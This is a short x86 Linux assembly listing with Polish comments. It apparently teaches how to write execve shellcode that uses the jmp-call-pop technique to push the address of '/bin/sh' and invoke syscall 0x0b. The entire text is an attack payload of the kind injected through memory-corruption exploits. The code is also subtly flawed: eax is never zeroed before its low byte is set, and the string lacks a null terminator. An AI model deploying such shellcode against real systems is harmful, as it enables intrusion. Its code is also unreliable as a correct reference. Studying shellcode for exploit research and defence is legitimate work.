global _start

section .text

_start:
    jmp MESSAGE         ;Skaczemy do naszej wiadomości 

GOBACK:
    pop ebx

    xor ecx, ecx 	
    xor edx, edx        
    xor esi, esi    ; Zerujemy kolejne rejestry.

    mov al, 0x0b 	; wykonujemy systemcall
    int 0x80      

MESSAGE:
    call GOBACK         ;Call zapamiętuje na stacu adres następnej instrukcji (w tym wypadku jest to adres naszej wiadomości) 
                        ;i następnie skacze do GOBACK.                                      
    db "/bin/sh"

section .data